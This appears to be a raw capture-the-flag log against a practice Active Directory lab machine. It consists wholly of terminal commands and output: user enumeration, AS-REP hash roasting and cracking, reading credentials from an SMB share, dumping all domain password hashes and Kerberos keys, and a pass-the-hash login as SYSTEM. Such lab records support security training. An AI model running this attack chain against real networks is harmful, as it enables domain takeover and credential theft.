

```bash
└─$ nmap -sC -A -sV 10.10.14.24
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-29 08:20 EDT
Nmap scan report for 10.10.14.24
Host is up (0.11s latency).
Not shown: 987 closed ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-04-29 12:21:18Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2021-04-29T12:21:30+00:00
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Not valid before: 2021-04-28T12:18:15
|_Not valid after:  2021-10-28T12:18:15
|_ssl-date: 2021-04-29T12:21:41+00:00; +2s from scanner time.
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1s, deviation: 0s, median: 1s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-04-29T12:21:33
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 61.26 seconds
```

```bash

┌──(kali㉿kali)-[~/Downloads]
└─$ sudo ./kerbrute_linux_amd64 userenum --dc spookysec.local -d spookysec.local 'list.txt' -t 100

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 04/29/21 - Ronnie Flathers @ropnop

2021/04/29 10:15:41 >  Using KDC(s):
2021/04/29 10:15:41 >  	spookysec.local:88

2021/04/29 10:15:42 >  [+] VALID USERNAME:	 svc-admin@spookysec.local
2021/04/29 10:15:49 >  [+] VALID USERNAME:	 james@spookysec.local
2021/04/29 10:15:54 >  [+] VALID USERNAME:	 James@spookysec.local
2021/04/29 10:15:57 >  [+] VALID USERNAME:	 robin@spookysec.local
2021/04/29 10:17:08 >  [+] VALID USERNAME:	 darkstar@spookysec.local
2021/04/29 10:17:13 >  [+] VALID USERNAME:	 administrator@spookysec.local
2021/04/29 10:17:17 >  [+] VALID USERNAME:	 backup@spookysec.local
2021/04/29 10:17:18 >  [+] VALID USERNAME:	 paradox@spookysec.local
2021/04/29 10:17:26 >  [+] VALID USERNAME:	 JAMES@spookysec.local
2021/04/29 10:17:29 >  [+] VALID USERNAME:	 Robin@spookysec.local
2021/04/29 10:17:42 >  [+] VALID USERNAME:	 Administrator@spookysec.local
2021/04/29 10:18:06 >  [+] VALID USERNAME:	 Darkstar@spookysec.local
2021/04/29 10:18:13 >  [+] VALID USERNAME:	 Paradox@spookysec.local
2021/04/29 10:18:37 >  [+] VALID USERNAME:	 DARKSTAR@spookysec.local
2021/04/29 10:18:44 >  [+] VALID USERNAME:	 ori@spookysec.local
2021/04/29 10:18:54 >  [+] VALID USERNAME:	 ROBIN@spookysec.local
2021/04/29 10:19:19 >  Done! Tested 73317 usernames (16 valid) in 217.928 seconds
```



```bash
─$ impacket-GetNPUsers -dc-ip 10.10.14.24 spookysec.local/svc-admin           2 ⨯
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password:
[*] Cannot authenticate svc-admin, getting its TGT
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:6e82e508e9b8b418cfb23e8c6c190b9b$dfe26a76036936ca5bcc47315ba5dfde6d4954bf84fc61628aedf27d2355b0f56a707a337a992cbc044f45c5d749809297ebc2373f1925cb11744eeefac8786be1287be3039f496ef843e327233e34da1604e3792d3094ca14ff4a4b31a646a27b5e8058374d1e84256c08c10c07d9dbdf2131f42b0f3204e4d0be618424ee04adf37c3638d35ce560cf1715e79b331b6ba8c1ff79c793ae3d387a7183f5ffa2460cc384810cdd179fe808a40250410bff7f8db494d3ec57bf058b3792d9f91b74f7985de99fb12ba1b6ae2b7fe3ec880d1e3b56ec0db2e12b7aeb1e948d18c6cbaf8780fdc709e5c9f89d7ebb06a2921983
```

```bash

──(kali㉿kali)-[~]
└─$ hashcat -m 18200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --force
hashcat (v6.1.1) starting...

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.
OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i5-5200U CPU @ 2.20GHz, 1423/1487 MB (512 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 99 MB

Dictionary cache building /usr/share/wordlists/rockyou.txt: 100660309 bytes (71.94%Dictionary cache building /usr/share/wordlists/rockyou.txt: 134213745 bytes (95.92%Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 14 secs

$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:6e82e508e9b8b418cfb23e8c6c190b9b$dfe26a76036936ca5bcc47315ba5dfde6d4954bf84fc61628aedf27d2355b0f56a707a337a992cbc044f45c5d749809297ebc2373f1925cb11744eeefac8786be1287be3039f496ef843e327233e34da1604e3792d3094ca14ff4a4b31a646a27b5e8058374d1e84256c08c10c07d9dbdf2131f42b0f3204e4d0be618424ee04adf37c3638d35ce560cf1715e79b331b6ba8c1ff79c793ae3d387a7183f5ffa2460cc384810cdd179fe808a40250410bff7f8db494d3ec57bf058b3792d9f91b74f7985de99fb12ba1b6ae2b7fe3ec880d1e3b56ec0db2e12b7aeb1e948d18c6cbaf8780fdc709e5c9f89d7ebb06a2921983:management2005
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, AS-REP
Hash.Target......: $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:6e82e508e9b...921983
Time.Started.....: Thu Apr 29 11:03:25 2021, (26 secs)
Time.Estimated...: Thu Apr 29 11:03:51 2021, (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   223.6 kH/s (8.07ms) @ Accel:32 Loops:1 Thr:64 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 5840896/14344384 (40.72%)
Rejected.........: 0/5840896 (0.00%)
Restore.Point....: 5836800/14344384 (40.69%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: manaiabj -> mamitaqerida

Started: Thu Apr 29 11:00:18 2021
Stopped: Thu Apr 29 11:03:53 2021
```

```bash

──(kali㉿kali)-[~]
└─$ smbclient \\\\10.10.14.24\\backup -U 'svc-admin'  
Enter WORKGROUP\svc-admin's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Apr  4 15:08:39 2020
  ..                                  D        0  Sat Apr  4 15:08:39 2020
  backup_credentials.txt              A       48  Sat Apr  4 15:08:53 2020

		8247551 blocks of size 4096. 4013560 blocks available
smb: \> cat backup_credentials.txt
cat: command not found
smb: \> less backup_credentials.txt
less: command not found
smb: \> help
?              allinfo        altname        archive        backup         
blocksize      cancel         case_sensitive cd             chmod          
chown          close          del            deltree        dir            
du             echo           exit           get            getfacl        
geteas         hardlink       help           history        iosize         
lcd            link           lock           lowercase      ls             
l              mask           md             mget           mkdir          
more           mput           newer          notify         open           
posix          posix_encrypt  posix_open     posix_mkdir    posix_rmdir    
posix_unlink   posix_whoami   print          prompt         put            
pwd            q              queue          quit           readlink       
rd             recurse        reget          rename         reput          
rm             rmdir          showacls       setea          setmode        
scopy          stat           symlink        tar            tarmode        
timeout        translate      unlock         volume         vuid           
wdel           logon          listconnect    showconnect    tcon           
tdis           tid            utimes         logoff         ..             
!              
smb: \> more backup_credentials.txt
getting file \backup_credentials.txt of size 48 as /tmp/smbmore.WQhJZG (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \> 
```

```bash


(kali㉿kali)-[~/Downloads]
└─$ base64 -d <<< YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw             1 ⨯

backup@spookysec.local:backup2517860
```


```bash
─(kali㉿kali)-[~/Downloads]
└─$ impacket-secretsdump -just-dc backup@spookysec.local
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::
spookysec.local\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::
spookysec.local\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::
spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::
spookysec.local\Ori:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::
spookysec.local\robin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::
spookysec.local\paradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::
spookysec.local\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::
spookysec.local\horshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::
spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
spookysec.local\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:41d3dda0b4a946474ac5ee495bf50551:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:713955f08a8654fb8f70afe0e24bb50eed14e53c8b2274c0c701ad2948ee0f48
Administrator:aes128-cts-hmac-sha1-96:e9077719bc770aff5d8bfc2d54d226ae
Administrator:des-cbc-md5:2079ce0e5df189ad
krbtgt:aes256-cts-hmac-sha1-96:b52e11789ed6709423fd7276148cfed7dea6f189f3234ed0732725cd77f45afc
krbtgt:aes128-cts-hmac-sha1-96:e7301235ae62dd8884d9b890f38e3902
krbtgt:des-cbc-md5:b94f97e97fabbf5d
spookysec.local\skidy:aes256-cts-hmac-sha1-96:3ad697673edca12a01d5237f0bee628460f1e1c348469eba2c4a530ceb432b04
spookysec.local\skidy:aes128-cts-hmac-sha1-96:484d875e30a678b56856b0fef09e1233
spookysec.local\skidy:des-cbc-md5:b092a73e3d256b1f
spookysec.local\breakerofthings:aes256-cts-hmac-sha1-96:4c8a03aa7b52505aeef79cecd3cfd69082fb7eda429045e950e5783eb8be51e5
spookysec.local\breakerofthings:aes128-cts-hmac-sha1-96:38a1f7262634601d2df08b3a004da425
spookysec.local\breakerofthings:des-cbc-md5:7a976bbfab86b064
spookysec.local\james:aes256-cts-hmac-sha1-96:1bb2c7fdbecc9d33f303050d77b6bff0e74d0184b5acbd563c63c102da389112
spookysec.local\james:aes128-cts-hmac-sha1-96:08fea47e79d2b085dae0e95f86c763e6
spookysec.local\james:des-cbc-md5:dc971f4a91dce5e9
spookysec.local\optional:aes256-cts-hmac-sha1-96:fe0553c1f1fc93f90630b6e27e188522b08469dec913766ca5e16327f9a3ddfe
spookysec.local\optional:aes128-cts-hmac-sha1-96:02f4a47a426ba0dc8867b74e90c8d510
spookysec.local\optional:des-cbc-md5:8c6e2a8a615bd054
spookysec.local\sherlocksec:aes256-cts-hmac-sha1-96:80df417629b0ad286b94cadad65a5589c8caf948c1ba42c659bafb8f384cdecd
spookysec.local\sherlocksec:aes128-cts-hmac-sha1-96:c3db61690554a077946ecdabc7b4be0e
spookysec.local\sherlocksec:des-cbc-md5:08dca4cbbc3bb594
spookysec.local\darkstar:aes256-cts-hmac-sha1-96:35c78605606a6d63a40ea4779f15dbbf6d406cb218b2a57b70063c9fa7050499
spookysec.local\darkstar:aes128-cts-hmac-sha1-96:461b7d2356eee84b211767941dc893be
spookysec.local\darkstar:des-cbc-md5:758af4d061381cea
spookysec.local\Ori:aes256-cts-hmac-sha1-96:5534c1b0f98d82219ee4c1cc63cfd73a9416f5f6acfb88bc2bf2e54e94667067
spookysec.local\Ori:aes128-cts-hmac-sha1-96:5ee50856b24d48fddfc9da965737a25e
spookysec.local\Ori:des-cbc-md5:1c8f79864654cd4a
spookysec.local\robin:aes256-cts-hmac-sha1-96:8776bd64fcfcf3800df2f958d144ef72473bd89e310d7a6574f4635ff64b40a3
spookysec.local\robin:aes128-cts-hmac-sha1-96:733bf907e518d2334437eacb9e4033c8
spookysec.local\robin:des-cbc-md5:89a7c2fe7a5b9d64
spookysec.local\paradox:aes256-cts-hmac-sha1-96:64ff474f12aae00c596c1dce0cfc9584358d13fba827081afa7ae2225a5eb9a0
spookysec.local\paradox:aes128-cts-hmac-sha1-96:f09a5214e38285327bb9a7fed1db56b8
spookysec.local\paradox:des-cbc-md5:83988983f8b34019
spookysec.local\Muirland:aes256-cts-hmac-sha1-96:81db9a8a29221c5be13333559a554389e16a80382f1bab51247b95b58b370347
spookysec.local\Muirland:aes128-cts-hmac-sha1-96:2846fc7ba29b36ff6401781bc90e1aaa
spookysec.local\Muirland:des-cbc-md5:cb8a4a3431648c86
spookysec.local\horshark:aes256-cts-hmac-sha1-96:891e3ae9c420659cafb5a6237120b50f26481b6838b3efa6a171ae84dd11c166
spookysec.local\horshark:aes128-cts-hmac-sha1-96:c6f6248b932ffd75103677a15873837c
spookysec.local\horshark:des-cbc-md5:a823497a7f4c0157
spookysec.local\svc-admin:aes256-cts-hmac-sha1-96:effa9b7dd43e1e58db9ac68a4397822b5e68f8d29647911df20b626d82863518
spookysec.local\svc-admin:aes128-cts-hmac-sha1-96:aed45e45fda7e02e0b9b0ae87030b3ff
spookysec.local\svc-admin:des-cbc-md5:2c4543ef4646ea0d
spookysec.local\backup:aes256-cts-hmac-sha1-96:23566872a9951102d116224ea4ac8943483bf0efd74d61fda15d104829412922
spookysec.local\backup:aes128-cts-hmac-sha1-96:843ddb2aec9b7c1c5c0bf971c836d197
spookysec.local\backup:des-cbc-md5:d601e9469b2f6d89
spookysec.local\a-spooks:aes256-cts-hmac-sha1-96:cfd00f7ebd5ec38a5921a408834886f40a1f40cda656f38c93477fb4f6bd1242
spookysec.local\a-spooks:aes128-cts-hmac-sha1-96:31d65c2f73fb142ddc60e0f3843e2f68
spookysec.local\a-spooks:des-cbc-md5:e09e4683ef4a4ce9
ATTACKTIVEDIREC$:aes256-cts-hmac-sha1-96:4b8fc948183e074fd6f92d7a94f2b669e08885722d4c8ff69fef15555a20540e
ATTACKTIVEDIREC$:aes128-cts-hmac-sha1-96:1e753cb9060a5a4c3b284c3c7f2387fc
ATTACKTIVEDIREC$:des-cbc-md5:026ba11c2016fb16
[*] Cleaning up... 
```


```bash
─(kali㉿kali)-[~/Downloads]
└─$ impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc administrator@spookysec.local 
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on spookysec.local.....
[*] Found writable share ADMIN$
[*] Uploading file frOFIRJO.exe
[*] Opening SVCManager on spookysec.local.....
[*] Creating service dhjD on spookysec.local.....
[*] Starting service dhjD.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1490]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>id
b"'id' is not recognized as an internal or external command,\r\noperable program or batch file.\r\n"
C:\Windows\system32>

```
     




